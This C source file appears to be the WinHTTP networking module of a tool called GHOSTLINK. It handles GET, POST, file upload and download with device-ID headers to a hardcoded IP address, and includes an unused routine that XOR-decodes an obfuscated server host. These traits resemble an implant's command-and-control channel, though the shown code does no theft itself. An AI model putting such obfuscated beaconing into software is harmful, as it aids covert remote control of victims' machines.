/*
 * GHOSTLINK Windows Network — WinHTTP REST client
 */
#include "client.h"

static HINTERNET hSession = NULL;
static WCHAR base_url[256];

void network_decode_host(WCHAR *out, int outLen) {
    BYTE enc[] = SERVER_HOST_ENC;
    char key[] = "GHOSTLINK";
    int len = sizeof(enc) - 1; /* minus null terminator */
    for (int i = 0; i < len && i < outLen - 1; i++)
        out[i] = (WCHAR)(enc[i] ^ key[i % 8]);
    out[len < outLen ? len : outLen - 1] = 0;
}

BOOL network_init(void) {
    hSession = WinHttpOpen(L"GHOSTLINK/1.0",
                            WINHTTP_ACCESS_TYPE_NO_PROXY,
                            WINHTTP_NO_PROXY_NAME,
                            WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    wsprintf(base_url, L"http%s://%s:%d", SERVER_USE_TLS ? L"s" : L"", L"150.195.114.185", SERVER_PORT);
    return TRUE;
}

void network_cleanup(void) {
    if (hSession) WinHttpCloseHandle(hSession);
    hSession = NULL;
}

HttpResponse* network_post(const char *path, const char *json_body) {
    if (!hSession) return NULL;

    WCHAR url[512];
    WCHAR wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 256);
    wsprintf(url, L"%s%s", base_url, wpath);

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    WCHAR hostname[256], urlPath[512];
    urlComp.lpszHostName = hostname; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;  urlComp.dwUrlPathLength = 512;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        SERVER_USE_TLS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return NULL; }

    /* Set JSON content type */
    LPCWSTR headers = L"Content-Type: application/json\r\n";
    DWORD bodyLen = (DWORD)strlen(json_body);

    if (!WinHttpSendRequest(hRequest, headers, -1, (LPVOID)json_body, bodyLen, bodyLen, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return NULL;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return NULL;
    }

    /* Read response */
    HttpResponse *r = calloc(1, sizeof(HttpResponse));
    r->cap = 4096;
    r->data = malloc(r->cap);

    DWORD bytesRead, totalRead = 0;
    while (WinHttpReadData(hRequest, r->data + totalRead, r->cap - totalRead - 1, &bytesRead)) {
        if (bytesRead == 0) break;
        totalRead += bytesRead;
        if (totalRead + 1024 >= r->cap) {
            r->cap *= 2;
            r->data = realloc(r->data, r->cap);
        }
    }
    r->data[totalRead] = 0;
    r->len = totalRead;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return r;
}

HttpResponse* network_get(const char *path) {
    if (!hSession) return NULL;

    WCHAR url[512], wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 256);
    wsprintf(url, L"%s%s", base_url, wpath);

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    WCHAR hostname[256], urlPath[512];
    urlComp.lpszHostName = hostname; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;  urlComp.dwUrlPathLength = 512;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return NULL; }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }

    HttpResponse *r = calloc(1, sizeof(HttpResponse));
    r->cap = 4096;
    r->data = malloc(r->cap);
    DWORD bytesRead, totalRead = 0;
    while (WinHttpReadData(hRequest, r->data + totalRead, r->cap - totalRead - 1, &bytesRead)) {
        if (bytesRead == 0) break;
        totalRead += bytesRead;
        if (totalRead + 1024 >= r->cap) {
            r->cap *= 2;
            r->data = realloc(r->data, r->cap);
        }
    }
    r->data[totalRead] = 0;
    r->len = totalRead;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return r;
}

HttpResponse* network_upload_file(const char *path, const BYTE *data, DWORD data_len,
                                   const char *sender_id, const char *recipient_id,
                                   const char *metadata_json) {
    if (!hSession) return NULL;

    WCHAR url[512], wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 256);
    wsprintf(url, L"%s%s", base_url, wpath);

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    WCHAR hostname[256], urlPath[512];
    urlComp.lpszHostName = hostname; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;  urlComp.dwUrlPathLength = 512;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return NULL; }

    /* Custom headers for file transfer */
    WCHAR headers[1024], senderW[128], recipW[128], metaW[512];
    MultiByteToWideChar(CP_UTF8, 0, sender_id, -1, senderW, 128);
    MultiByteToWideChar(CP_UTF8, 0, recipient_id, -1, recipW, 128);
    MultiByteToWideChar(CP_UTF8, 0, metadata_json, -1, metaW, 512);
    wsprintf(headers, L"X-Device-ID: %s\r\nX-Recipient-ID: %s\r\nX-File-Metadata: %s\r\nContent-Type: application/octet-stream\r\n",
             senderW, recipW, metaW);

    if (!WinHttpSendRequest(hRequest, headers, -1, (LPVOID)data, data_len, data_len, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }

    /* Read response */
    HttpResponse *r = calloc(1, sizeof(HttpResponse));
    r->cap = 4096;
    r->data = malloc(r->cap);
    DWORD bytesRead, totalRead = 0;
    while (WinHttpReadData(hRequest, r->data + totalRead, r->cap - totalRead - 1, &bytesRead)) {
        if (bytesRead == 0) break;
        totalRead += bytesRead;
        if (totalRead + 1024 >= r->cap) {
            r->cap *= 2;
            r->data = realloc(r->data, r->cap);
        }
    }
    r->data[totalRead] = 0;
    r->len = totalRead;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return r;
}

HttpResponse* network_download_file(const char *path, const char *device_id,
                                     BYTE **out_data, DWORD *out_len) {
    if (!hSession) return NULL;

    WCHAR url[512], wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 256);
    wsprintf(url, L"%s%s", base_url, wpath);

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    WCHAR hostname[256], urlPath[512];
    urlComp.lpszHostName = hostname; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;  urlComp.dwUrlPathLength = 512;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return NULL; }

    WCHAR headers[256], devW[128];
    MultiByteToWideChar(CP_UTF8, 0, device_id, -1, devW, 128);
    wsprintf(headers, L"X-Device-ID: %s\r\n", devW);

    if (!WinHttpSendRequest(hRequest, headers, -1, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return NULL;
    }

    /* Read binary response into growing buffer */
    DWORD cap = 65536;
    BYTE *buf = malloc(cap);
    DWORD totalRead = 0, bytesRead;
    while (WinHttpReadData(hRequest, buf + totalRead, cap - totalRead, &bytesRead)) {
        if (bytesRead == 0) break;
        totalRead += bytesRead;
        if (totalRead + 65536 >= cap) {
            cap *= 2;
            buf = realloc(buf, cap);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);

    *out_data = buf;
    *out_len = totalRead;
    return NULL;  /* No JSON response for file downloads, data is in out_data */
}

void network_free_response(HttpResponse *r) {
    if (!r) return;
    if (r->data) free(r->data);
    free(r);
}
